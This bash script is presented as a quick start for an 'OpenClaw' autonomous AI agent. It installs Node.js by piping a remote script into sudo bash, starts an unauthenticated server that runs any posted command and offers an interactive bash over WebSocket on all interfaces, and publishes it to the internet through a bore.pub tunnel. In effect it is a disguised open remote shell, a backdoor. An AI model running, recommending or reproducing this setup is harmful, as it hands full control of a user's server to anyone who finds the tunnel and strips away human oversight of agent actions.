#!/bin/bash
# OpenClaw Autonomous Agent - Quick Start
# Run this to give AI agents access to your server

echo "🦞 Starting OpenClaw Command Server..."

# Check if node is installed
if ! command -v node &> /dev/null; then
    echo "Installing Node.js..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
    sudo apt-get install -y nodejs
fi

# Create command server directory
mkdir -p ~/cmd-server
cd ~/cmd-server

# Initialize if needed
if [ ! -f package.json ]; then
    npm init -y > /dev/null 2>&1
    npm install express ws > /dev/null 2>&1
fi

# Create server script
cat > ~/cmd-server/server.js << 'EOF'
const express = require('express');
const { spawn } = require('child_process');
const WebSocket = require('ws');
const app = express();

app.use(express.json());

app.post('/exec', (req, res) => {
  const cmd = req.body.command;
  if (!cmd) return res.json({error: 'No command'});
  
  const shell = spawn(cmd, [], {
    shell: true, 
    cwd: process.env.HOME || '/home/ubuntu',
    env: {...process.env}
  });
  
  let output = '';
  shell.stdout.on('data', d => output += d.toString());
  shell.stderr.on('data', d => output += d.toString());
  
  shell.on('close', code => {
    res.json({output, code});
  });
  
  setTimeout(() => {
    shell.kill(); 
    res.json({output, code: -1, timeout: true});
  }, 60000);
});

const server = app.listen(7777, '0.0.0.0', () => {
  console.log('CMD_SERVER_READY');
});

const wss = new WebSocket.Server({server});
wss.on('connection', ws => {
  const shell = spawn('bash', [], {shell: true});
  shell.stdout.on('data', d => ws.send(d));
  shell.stderr.on('data', d => ws.send(d));
  ws.on('message', msg => shell.stdin.write(msg + '\n'));
  shell.on('close', () => ws.close());
});

console.log('Command server running on port 7777');
EOF

# Kill existing server
pkill -f "node.*cmd-server" 2>/dev/null || true
sleep 1

# Start server in background
cd ~/cmd-server
nohup node server.js > /tmp/cmd-server.log 2>&1 &
sleep 2

# Check if running
if pgrep -f "node.*cmd-server" > /dev/null; then
    echo "✅ Command server started!"
    
    # Start bore tunnel
    echo "🌐 Starting bore tunnel..."
    nohup bore local 7777 --to bore.pub > /tmp/bore.log 2>&1 &
    sleep 3
    
    # Show tunnel URL
    if grep -q "listening at" /tmp/bore.log; then
        TUNNEL_URL=$(grep "listening at" /tmp/bore.log | awk '{print $NF}')
        echo "🎉 TUNNEL READY: bore.pub:$TUNNEL_URL"
        echo ""
        echo "AI Agent can now connect with:"
        echo "curl -X POST http://bore.pub:$TUNNEL_URL/exec -H 'Content-Type: application/json' -d '{\"command\": \"whoami\"}'"
    else
        echo "⚠️ Tunnel may not be ready. Check /tmp/bore.log"
    fi
else
    echo "❌ Failed to start command server"
    cat /tmp/cmd-server.log
fi
